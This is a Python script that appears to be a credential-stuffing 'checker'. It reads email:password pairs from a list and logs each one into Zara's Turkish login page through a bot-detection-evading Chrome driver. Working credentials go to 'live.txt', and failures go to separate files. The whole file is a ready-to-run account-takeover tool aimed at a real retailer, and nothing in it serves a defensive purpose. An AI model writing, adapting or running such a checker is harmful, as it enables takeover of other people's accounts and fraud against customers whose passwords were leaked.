import time
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def login_to_zara(email, password):
    try:
        options = uc.ChromeOptions()
        driver = uc.Chrome(options=options)

        driver.get('https://www.zara.com/tr/tr/logon')

        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'logonId3')))

        try:
            privacy_close_button = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.CLASS_NAME, 'onetrust-close-btn-handler'))
            )
            privacy_close_button.click()
        except Exception as e:
            print(f"Gizlilik bildirimi kapatma butonu bulunamadı: {e}")

        email_field = driver.find_element(By.ID, 'logonId3')
        email_field.send_keys(email)

        password_field = driver.find_element(By.ID, 'password7')
        password_field.send_keys(password)

        login_button = driver.find_element(By.CSS_SELECTOR, 'button[data-qa-action="logon-form-submit"]')
        login_button.click()

        time.sleep(5)

        current_url = driver.current_url
        if "order" in current_url:
            with open('live.txt', 'a') as live_file:
                live_file.write(f'{email}:{password}\n')
        elif "logon" in current_url:
            with open('offkanka.txt', 'a') as offkanka_file:
                offkanka_file.write(f'{email}:{password} - Giriş yapılamadı\n')
        elif "invalid-session" in current_url:
            with open('hatalı.txt', 'a') as hatalı_file:
                hatalı_file.write(f'{email}:{password} - tekrar checklet bunu\n')

        driver.quit()
    except Exception as e:
        with open('offkanka.txt', 'a') as offkanka_file:
            offkanka_file.write(f'{email}:{password} - Error: {str(e)}\n')

with open('zara.txt', 'r', encoding='utf-8') as file:
    lines = file.readlines()

for line in lines:
    email, password = line.strip().split(':')
    login_to_zara(email, password)

with open('bitti.txt', 'w', encoding='utf-8') as bitti_file:
    bitti_file.write('bitti.\n')